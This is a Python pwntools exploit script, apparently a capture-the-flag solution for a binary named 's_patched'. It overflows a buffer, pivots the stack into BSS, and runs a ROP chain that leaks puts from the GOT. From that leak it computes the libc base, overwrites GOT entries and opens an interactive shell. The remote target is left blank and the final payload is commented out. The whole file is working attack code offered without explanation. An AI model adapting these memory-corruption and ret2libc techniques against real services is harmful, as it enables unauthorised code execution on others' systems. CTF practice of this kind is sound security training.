#!/usr/bin/python3

from pwn import *

exe = ELF('s_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* shell+46

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
payload = b'cat '.ljust(0x10, b"a") + p64(exe.bss(0xf00)) + p64(0x40160e)
s(payload)
p.recvuntil(b"/cats\n")
payload = b'cat '.ljust(0x10, b"a") + p64(exe.bss(0xf18)) + p64(0x40160e)
s(payload)

payload = p64(0x00000000004016f3) + p64(exe.got.puts)
payload += p64(exe.plt.puts) + p64(exe.sym.shell+29)
s(payload)
p.recvuntil(b"/cats\n")
leak = u64(p.recvline(keepends=False) + b"\0\0")
libc.address = leak - libc.sym.puts
print(hex(leak))
print(hex(libc.address))
payload = p64(exe.got.printf+0x10) + p64(0x40160e) + p64(exe.bss(0xf08)) + p64(0x4015ef)
sl(payload)
payload = p64(0x000000000040101a) + p64(libc.sym.read) + p64(libc.sym.strtok) + p64(0x40160e)
# s(payload)

p.interactive()
